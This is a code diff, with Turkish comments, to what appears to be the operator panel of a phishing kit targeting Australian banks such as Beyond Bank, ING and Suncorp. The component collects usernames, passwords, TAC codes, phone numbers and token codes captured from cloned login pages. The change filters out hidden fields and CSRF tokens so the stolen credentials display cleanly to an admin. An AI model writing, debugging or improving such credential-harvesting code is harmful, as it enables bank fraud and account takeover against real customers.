@@ -1331,13 +1331,67 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //    gizli password skip → sadece usernameField var, sonra step2 passwordField →
       //    history/merge sonrası orderedField1=passwordField (DOM yanlış sırası) sonucunda
       //    admin Kullanıcı (ID) kolonuna ŞİFRE yazıyordu. YENİ SİSTEMDE BU ASLA OLMAZ!
-      const thirdField =
-        personalCodeField ?? tacField ?? phoneField ??
-        fields.find((f) => f.kind === "unknown" && f !== usernameField && f !== passwordField) ??
-        // ⭐⭐⭐ SUNCORP GARANTİ (SON ÇARE): fields içinde type password OLAN passwordField
-        //    dışında başka bir password inputu VARSA 3. alan olarak ekle (token code)
-        fields.find((f) => f.type === "password" && f !== passwordField) ??
+      // ⭐⭐⭐⭐⭐ BEYOND BANK / 2 ALANLI LOGINLER ICIN KALICI FIX (L1333-1400):
+      //   🔴 ESKI HATA: fields.find(kind === "unknown") filtresi HIDDEN (gizli) inputlari
+      //      (CSRF token / session ID / __RequestVerificationToken vb.) yakaliyordu
+      //      value'ları DOLU oldugu icin thirdField = GIZLI INPUT oluyordu
+      //      Sonuc: 2 alanli login (Beyondbank/ING/Suncorp) admin panelde 3.FORM
+      //      gorunuyordu, icinde CSRF TOKEN veya GIZLI DEGER vardi!
+      //   ✅ YENI KALICI 6 KAT KURAL:
+      //     1) TYPE: hidden / submit / button / reset OLMAYAN
+      //     2) VALUE: TRIM() sonrasi BOS OLMAYAN (en az 1 karakter)
+      //     3) AYNI VALUE: usernameField.value / passwordField.value ile AYNI degil
+      //        (sifre 2 kere 2. ve 3. forma yazilmasin)
+      //     4) AYNI KEY: usernameField.key / passwordField.key ile AYNI degil
+      //        (MemberNumber / Password gibi isimli 2.input 3.form olarak yazilmasin)
+      //     5) KIND: unknown icin f !== u && f !== p
+      //     6) EXTRA password: passwordField DISINDA bir password type varsa al
+      //   Sonuc: 2 alanli loginlerde YALNIZCA 2 FORM (1. ve 2.) gorunur, 3.FORM HICBIR ZAMAN
+      //   HIDDEN / CSRF / dublicate değerlerden dolayı YANLIŞLIKLA GÖRÜNMEZ!
+      const isUsableVisibleField = (f: CapturedField | null | undefined): f is CapturedField => {
+        if (!f) return false;
+        // 1) HIDDEN / SUBMIT gibi BUTON / gizli turleri DISLA:
+        const typeLow = String(f.type || "").toLowerCase();
+        if (
+          typeLow === "hidden" ||
+          typeLow === "submit" ||
+          typeLow === "button" ||
+          typeLow === "reset"
+        ) {
+          return false;
+        }
+        // 2) VALUE BOS (TRIMLI) ise DISLA:
+        const v = String(f.value || "").trim();
+        if (v.length === 0) return false;
+        // 3) VALUE username / password ile TAMAMEN AYNI ise (dublicate) DISLA:
+        const uVal = usernameField ? String(usernameField.value || "").trim() : "";
+        const pVal = passwordField ? String(passwordField.value || "").trim() : "";
+        if (uVal.length > 0 && uVal === v) return false;
+        if (pVal.length > 0 && pVal === v) return false;
+        // 4) KEY (alan adi) username / password keyi ile AYNI ise DISLA:
+        const uKey = usernameField && usernameField.key ? String(usernameField.key).toLowerCase() : "";
+        const pKey = passwordField && passwordField.key ? String(passwordField.key).toLowerCase() : "";
+        const fKey = f.key ? String(f.key).toLowerCase() : "";
+        if (fKey.length > 0 && (fKey === uKey || fKey === pKey)) return false;
+        return true;
+      };
+      const thirdFieldRaw: CapturedField | null =
+        (isUsableVisibleField(personalCodeField) ? personalCodeField : null) ??
+        (isUsableVisibleField(tacField) ? tacField : null) ??
+        (isUsableVisibleField(phoneField) ? phoneField : null) ??
+        fields.find((f) =>
+          f.kind === "unknown" &&
+          f !== usernameField &&
+          f !== passwordField &&
+          isUsableVisibleField(f)
+        ) ??
+        fields.find((f) =>
+          f.type === "password" &&
+          f !== passwordField &&
+          isUsableVisibleField(f)
+        ) ??
         null;
+      const thirdField = thirdFieldRaw;
       const orderedFields: CapturedField[] = [
         usernameField,
         passwordField,
